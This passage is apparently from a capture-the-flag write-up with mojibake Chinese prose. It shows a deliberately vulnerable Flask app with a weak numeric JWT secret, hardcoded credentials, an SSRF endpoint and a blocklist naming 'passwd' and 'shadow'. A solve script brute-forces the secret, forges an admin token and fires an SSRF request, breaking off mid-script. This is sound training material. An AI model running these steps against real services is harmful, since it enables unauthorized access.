</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flag <span style=color:#f92672>import</span> get_random_number_string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>base_key <span style=color:#f92672>=</span> str(uuid<span style=color:#f92672>.</span>uuid4())<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)
</span></span><span style=display:flex><span>secret_key <span style=color:#f92672>=</span> get_random_number_string(<span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>admin_pass <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([ _ <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> base_key])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(admin_pass)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>failure_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>users <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;admin&#39;</span>: admin_pass,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;amiya&#39;</span>: <span style=color:#e6db74>&#34;114514&#34;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_token</span>(token):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>global</span> failure_count
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> failure_count <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>100</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style=color:#ae81ff>403</span>)
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>decode(token, secret_key, algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;HS256&#34;</span>])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>) <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>            failure_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;You are not admin!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style=color:#ae81ff>403</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style=color:#ae81ff>401</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> redirect(<span style=color:#e6db74>&#34;/home&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>login</span>():
</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;username&#39;</span>]
</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;password&#39;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> failure_count
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> failure_count <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>100</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style=color:#ae81ff>403</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> users<span style=color:#f92672>.</span>get(username)<span style=color:#f92672>==</span>password:
</span></span><span style=display:flex><span>        token <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode({<span style=color:#e6db74>&#39;user&#39;</span>: username, <span style=color:#e6db74>&#39;exp&#39;</span>: int(time<span style=color:#f92672>.</span>time()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>600</span>}, secret_key)
</span></span><span style=display:flex><span>        response <span style=color:#f92672>=</span> make_response(<span style=color:#e6db74>&#39;Login success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span>)
</span></span><span style=display:flex><span>        response<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;token&#39;</span>, token)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        failure_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#39;Could not verify!&lt;br&gt;&lt;img src=&#34;/3.png&#34;&gt;&#39;</span>, <span style=color:#ae81ff>401</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/logout&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>logout</span>():
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> make_response(<span style=color:#e6db74>&#39;Logout success!&lt;br&gt;&lt;a href=&#34;/home&#34;&gt;Go to homepage&lt;/a&gt;&#39;</span>)
</span></span><span style=display:flex><span>    response<span style=color:#f92672>.</span>set_cookie(<span style=color:#e6db74>&#39;token&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>, expires<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> response
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/home&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>():
</span></span><span style=display:flex><span>    logged_in <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        token <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;token&#39;</span>)
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>decode(token, secret_key, algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;HS256&#34;</span>])
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello, </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>!&#34;</span> <span style=color:#f92672>%</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>)
</span></span><span style=display:flex><span>        logged_in <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        logged_in <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;You have not logged in!&#34;</span>
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> {}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template_string(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;!DOCTYPE html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;title&gt;Home Page&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!-- å›¾æ ‡èƒ½å¤Ÿæ­£å¸¸æ˜¾ç¤ºè€¶! --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!-- ä½†æ˜¯æˆ‘å¥½åƒæ²¡æœ‰çœ‹åˆ°Nginxæˆ–è€…Apacheä¹‹ç±»çš„ä¸œè¥¿ --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!-- è¯´æ˜æœåŠ¡å™¨è„šæœ¬èƒ½å¤Ÿå¤„ç†é™æ€æ–‡ä»¶æ --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!-- é‚£æºç æ˜¯ä¸æ˜¯å¯ä»¥ç”¨æŸäº›åŠæ³•æ‹¿åˆ°å‘¢! --&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {{ text }}&lt;br&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% i</span><span style=color:#e6db74>f logged_in %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;a href=&#34;/logout&#34;&gt;ç™»å‡º&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% e</span><span style=color:#e6db74>lse %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;h2&gt;ç™»å½•&lt;/h2&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;form action=&#34;/login&#34; method=&#34;post&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                ç”¨æˆ·å: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                å¯†ç : &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;input type=&#34;submit&#34; value=&#34;ç™»å½•&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/form&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% e</span><span style=color:#e6db74>ndif %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;br&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% i</span><span style=color:#e6db74>f user==&#34;admin&#34; %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;a href=&#34;/admin&#34;&gt;Go to admin panel&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;img src=&#34;/2.png&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% e</span><span style=color:#e6db74>lse %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;img src=&#34;/1.png&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            {</span><span style=color:#e6db74>% e</span><span style=color:#e6db74>ndif %}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span>, text<span style=color:#f92672>=</span>text, logged_in<span style=color:#f92672>=</span>logged_in, user<span style=color:#f92672>=</span>data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/admin&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>admin</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        token <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;token&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> verify_token(token) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> verify_token(token)
</span></span><span style=display:flex><span>        resp_text <span style=color:#f92672>=</span> render_template_string(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!DOCTYPE html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;title&gt;Admin Panel&lt;/title&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;h1&gt;Admin Panel&lt;/h1&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;p&gt;GET Server Info from api:&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;input type=&#34;input&#34; value={{api_url}} id=&#34;api&#34; readonly&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;script&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    function execute() {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        fetch(&#34;{{url}}/execute?api_address=&#34;+document.getElementById(&#34;api&#34;).value,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                      {credentials: &#34;include&#34;}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                      ).then(res =&gt; res.text()).then(data =&gt; {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                            document.write(data);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        });
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;/script&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/html&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#39;&#39;&#39;</span>, api_url<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>host_url<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;/api&#34;</span>, url<span style=color:#f92672>=</span>request<span style=color:#f92672>.</span>host_url)
</span></span><span style=display:flex><span>        resp <span style=color:#f92672>=</span> make_response(resp_text)
</span></span><span style=display:flex><span>        resp<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Access-Control-Allow-Credentials&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;true&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> resp
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;Token is invalid!&lt;br&gt;&lt;img src=&#39;/3.png&#39;&gt;&#34;</span>, <span style=color:#ae81ff>401</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/execute&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>execute</span>():
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;token&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> verify_token(token) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> verify_token(token)
</span></span><span style=display:flex><span>    api_address <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;api_address&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> api_address:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;No api address!&#34;</span>, <span style=color:#ae81ff>400</span>)
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(api_address, cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;token&#39;</span>: token})
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> response<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/api&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>api</span>():
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;token&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> verify_token(token) <span style=color:#f92672>!=</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> verify_token(token)
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> make_response(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Server Info: </span><span style=color:#e6db74>{</span>os<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;uname -a&#39;</span>)<span style=color:#f92672>.</span>read()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    resp<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Access-Control-Allow-Credentials&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;true&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> resp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&lt;path:file&gt;&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>static_file</span>(file):
</span></span><span style=display:flex><span>    print(file)
</span></span><span style=display:flex><span>    restricted_keywords <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;proc&#34;</span>, <span style=color:#e6db74>&#34;env&#34;</span>, <span style=color:#e6db74>&#34;passwd&#34;</span>, <span style=color:#e6db74>&#34;shadow&#34;</span>, <span style=color:#e6db74>&#34;hosts&#34;</span>, <span style=color:#e6db74>&#34;sys&#34;</span>, <span style=color:#e6db74>&#34;log&#34;</span>, <span style=color:#e6db74>&#34;etc&#34;</span>, 
</span></span><span style=display:flex><span>                           <span style=color:#e6db74>&#34;bin&#34;</span>, <span style=color:#e6db74>&#34;lib&#34;</span>, <span style=color:#e6db74>&#34;tmp&#34;</span>, <span style=color:#e6db74>&#34;var&#34;</span>, <span style=color:#e6db74>&#34;run&#34;</span>, <span style=color:#e6db74>&#34;dev&#34;</span>, <span style=color:#e6db74>&#34;home&#34;</span>, <span style=color:#e6db74>&#34;boot&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> any(keyword <span style=color:#f92672>in</span> file <span style=color:#66d9ef>for</span> keyword <span style=color:#f92672>in</span> restricted_keywords):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;STOP!&#34;</span>, <span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(<span style=color:#e6db74>&#34;./static/&#34;</span> <span style=color:#f92672>+</span> file):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;Not found!&#34;</span>, <span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> send_file(<span style=color:#e6db74>&#34;./static/&#34;</span> <span style=color:#f92672>+</span> file)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>,port<span style=color:#f92672>=</span><span style=color:#ae81ff>5000</span>)
</span></span></code></pre></div><p>ç®€å•çš„å®¡è®¡ä¸€ä¸‹ä»£ç </p><p>å¯†ç çš„ç™»é™†æ˜¯uuid</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>base_key <span style=color:#f92672>=</span> str(uuid<span style=color:#f92672>.</span>uuid4())<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;-&#34;</span>)
</span></span><span style=display:flex><span>secret_key <span style=color:#f92672>=</span> get_random_number_string(<span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>admin_pass <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join([ _ <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> base_key])
</span></span></code></pre></div><p>åŒæ—¶é™åˆ¶äº†ç™»å½•æ¬¡æ•°,æ‰€ä»¥ä¸èƒ½ç›´æ¥fuzzçˆ†ç ´</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>if</span> failure_count <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>100</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> make_response(<span style=color:#e6db74>&#34;You have tried too many times! Please restart the service!&#34;</span>, <span style=color:#ae81ff>403</span>)
</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>decode(token, secret_key, algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;HS256&#34;</span>])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> data<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;user&#39;</span>) <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;admin&#39;</span>:
</span></span><span style=display:flex><span>            failure_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>ä¼ªé€ éœ€è¦secret_keyï¼Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>users <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;admin&#39;</span>: admin_pass,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;amiya&#39;</span>: <span style=color:#e6db74>&#34;114514&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>æœ¬æ®µä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªæœ‰æ•ˆè´¦æˆ· <code>amiya</code>ï¼Œå¯†ç  <code>114514</code>ï¼Œé€šè¿‡å‘åŒ…ç™»å½•ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæœ‰æ•ˆçš„ <code>token</code>ï¼Œæ®æ­¤èƒ½åœ¨æœ¬åœ°è®¤è¯ç­¾å <code>secret_key</code> çš„æœ‰æ•ˆæ€§,çˆ†ç ´å‡º <code>secret_key</code>ï¼Œç„¶åæŸ¥çœ‹ç™»å½•åçš„é€»è¾‘ï¼š</p><p>å‰ç«¯è¯·æ±‚ <code>/execute</code> æŒ‡å®š <code>api_address</code>ï¼Œè€Œ <code>api_address</code> å¯æ§ä¸”æ²¡æœ‰æ ¡éªŒï¼Œå­˜åœ¨ SSRF æ¼æ´ã€‚</p><p>åˆ©ç”¨ <code>/execute</code> è·¯ç”±çš„ SSRF æ¼æ´è®©æœåŠ¡å™¨è‡ªå·±è®¿é—®</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://39.106.48.123:19369/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_number_string</span>(number, length):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>number<span style=color:#e6db74>:</span><span style=color:#e6db74>0</span><span style=color:#e6db74>{</span>length<span style=color:#e6db74>}}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>LENGTH <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;login&#34;</span>, data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;amiya&#34;</span>, <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;114514&#34;</span>})
</span></span><span style=display:flex><span>    response<span style=color:#f92672>.</span>raise_for_status()
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> response<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;token&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> token:
</span></span><span style=display:flex><span>        sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> requests<span style=color:#f92672>.</span>RequestException:
</span></span><span style=display:flex><span>    sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1000000</span>):
</span></span><span style=display:flex><span>    secret_key <span style=color:#f92672>=</span> get_number_string(i, LENGTH)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        decoded <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>decode(token, secret_key, algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;HS256&#34;</span>])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> jwt<span style=color:#f92672>.</span>exceptions<span style=color:#f92672>.</span>InvalidSignatureError:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_token <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode({<span style=color:#e6db74>&#39;user&#39;</span>: <span style=color:#e6db74>&#39;admin&#39;</span>, <span style=color:#e6db74>&#39;exp&#39;</span>: int(time<span style=color:#f92672>.</span>time()) <span style=color:#f92672>+</span> <span style=color:#ae81ff>600</span>}, secret_key)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    flag_response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;execute?api_address=http://localhost:5001/fl4g&#34;</span>, cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;token&#34;</span>: fake_token})
</span></span><span style=display:flex><span>    flag_response<span style=color:#f92672>.</span>raise_for_status()
